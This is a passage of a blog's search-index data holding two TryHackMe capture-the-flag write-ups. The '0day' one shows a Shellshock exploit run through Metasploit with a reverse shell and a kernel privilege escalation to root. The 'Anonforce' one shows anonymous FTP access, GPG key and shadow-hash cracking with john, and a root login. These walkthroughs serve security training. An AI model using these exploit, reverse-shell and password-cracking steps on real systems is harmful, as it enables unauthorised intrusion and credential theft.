[Size: 301] [--\u0026gt; http://0day.thm/css/] /js (Status: 301) [Size: 300] [--\u0026gt; http://0day.thm/js/] /backup (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/backup/] /secret (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/secret/] ... /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] ... We get private RSA from /backup, let\u0026rsquo;s crack it using john.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY----- └──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key \u0026gt; rsa.hash └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash ... letmein (./rsa_private_key) Then I tried to login with ssh, but I can\u0026rsquo;t. Damm it! It\u0026rsquo;s a rabbit hole.\nI am clueless now, maybe Nikto scan can help.\n└──╼ $nikto -h 0day.thm - Nikto v2.1.5 --------------------------------------------------------------------------- + Target IP: 10.10.152.56 + Target Hostname: 0day.thm + Target Port: 80 + Start Time: 2023-06-12 16:08:31 (GMT5.5) --------------------------------------------------------------------------- + Server: Apache/2.4.7 (Ubuntu) + Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 + The anti-clickjacking X-Frame-Options header is not present. + \u0026#34;robots.txt\u0026#34; retrieved but it does not contain any \u0026#39;disallow\u0026#39; entries (which is odd). + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST + OSVDB-3092: /admin/: This might be interesting... + OSVDB-3092: /backup/: This might be interesting... + OSVDB-3268: /img/: Directory indexing found. + OSVDB-3092: /img/: This might be interesting... + OSVDB-3092: /secret/: This might be interesting... + OSVDB-3092: /cgi-bin/test.cgi: This might be interesting... ... We have checked other files, but this test.cgi is new, after checking that endpoint, in a response it said Hello World!, huh, weird.\nAfter searching on Hacktricks I tried to test it using nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 └──╼ $nmap 0day.thm -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:21 IST Nmap scan report for 0day.thm (10.10.152.56) Host is up (0.18s latency). PORT STATE SERVICE 80/tcp open http | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | References: | http://seclists.org/oss-sec/2014/q3/685 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | http://www.openwall.com/lists/oss-security/2014/09/24/10 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 Now, we metasploit exploit to get the shell.\nuser flag using metasploit we can shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search shellshock # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/advantech_switch_bash_env_exec 2015-12-01 excellent Yes Advantech Switch Bash Environment Variable Code Injection (Shellshock) 1 exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24 excellent Yes Apache mod_cgi Bash Environment Variable Code Injection (Shellshock) 2 auxiliary/scanner/http/apache_mod_cgi_bash_env 2014-09-24 normal Yes Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner ... results ... [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 1 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set rhosts 0day.thm rhosts =\u0026gt; 0day.thm [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set targeturi /cgi-bin/test.cgi targeturi =\u0026gt; /cgi-bin/test.cgi [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show payloads ... results ... 27 payload/linux/x86/shell/reverse_tcp normal No Linux Command Shell, Reverse TCP Stager [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set payload 27 payload =\u0026gt; linux/x86/shell/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set lhost 10.8.95.227 lhost =\u0026gt; 10.8.95.227 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 0day.thm yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /cgi-bin/test.cgi yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on a ll addresses. SRVPORT 8080 yes The local port to listen on. Payload options (linux/x86/shell/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.8.95.227 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.8.95.227:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (36 bytes) to 10.10.152.56 [*] Command shell session 1 opened (10.8.95.227:4444 -\u0026gt; 10.10.152.56:48442) at 2023-06-12 16:32:43 +0530 id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 shell [*] Trying to find binary \u0026#39;python\u0026#39; on the target machine [*] Found python at /usr/bin/python [*] Using `python` to pop up an interactive shell [*] Trying to find binary \u0026#39;bash\u0026#39; on the target machine [*] Found bash at /bin/bash www-data@ubuntu:/usr/lib/cgi-bin$ ls ls test.cgi www-data@ubuntu:/usr/lib/cgi-bin$ cd /home cd /home www-data@ubuntu:/home$ ls ls ryan www-data@ubuntu:/home$ cd ryan cd ryan www-data@ubuntu:/home/ryan$ ls ls user.txt www-data@ubuntu:/home/ryan$ cat user.txt cat user.txt THM{Sh3llSh0ck_r0ckz} root flag After executing linpeas, we got the exploit exploit.\ncompile exploit using gcc.\ngcc ofs.c -o ofs\nUpload to server using python -m http.server\nRun binary to get root!!\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@ubuntu:/tmp$ ./ofs ./ofs spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library whoami root cat /root/root.txt THM{g00d_j0b_0day_isPleased} ","description":"Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":6,"section":"posts","tags":["TryHackMe","Shellshock","HashCracking"],"title":"TryHackMe Writeup - 0day Room","uri":"https://g4nd1v.github.io/posts/tryhackme-0day/"},{"content":"Title Title https://tryhackme.com/room/bsidesgtanonforce Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 └─$ nmap -sC -sV -oA nmap/anonforce 10.10.57.47 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 20:07 EST Nmap scan report for 10.10.57.47 Host is up (0.100s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Feb 21 17:04 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 103 0 0 0 Feb 21 17:04 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Feb 21 17:04 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Feb 21 17:04 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.95.227 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds Here we can see that FTP is open.\nLogin with ftp with anonymous username and empty password.\nUser Flag In /home/melodias there is a user.txt file. We have to download the file using get command.\nUsing get user.txt it will download user.txt file in current directory.\nuser.txt → 606083fd33beb1284fc51f411a706af8\nRoot Flag After surfing through different directories, I found a specific one notread and when you change your directory in notread, you will see 2 files i.e. backup.pgp and private.asc. Now, download both of the files using get command.\nFrom this article https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html we can get to know how to crack GPG private key using john.\nFirstly, convert it into hash.\n└─$ gpg2john private.asc \u0026gt; hash.hash\nThen using john we can crack the hash.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2024-02-21 20:21) 4.761g/s 4428p/s 4428c/s 4428C/s lawrence..sheena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. The plaintext is xbox360.\nNow, import private.asc in gpg and then decrypt it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 └─$ gpg --import private.asc gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key B92CD1F280AD82C2: public key \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; imported gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: imported: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 └─$ gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7::: Copy this shadow file in shadow.txt and the using john we can decrypt the password for root.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt Warning: only loading hashes of type \u0026#34;sha512crypt\u0026#34;, but also saw type \u0026#34;md5crypt\u0026#34; Use the \u0026#34;--format=md5crypt\u0026#34; option to force loading hashes of that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hikari (root) 1g 0:00:00:13 DONE (2024-02-21 20:35) 0.07293g/s 490.1p/s 490.1c/s 490.1C/s oblivion..BITCH Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Root password is hikari.\nUsing ssh we can login with root and then get the root flag using cat /root/root.txt\nFlag: f706456440c7af4187810c31c6cebdce\n","description":"boot2root machine for FIT and bsides guatemala CTF","id":7,"section":"posts","tags":["TryHackMe","FTP","John-The-Ripper"],"title":"TryHackMe Writeup - Anonforce Room","uri":"https://g4nd1v.github.io/posts/tryhackme-anonforce/"}]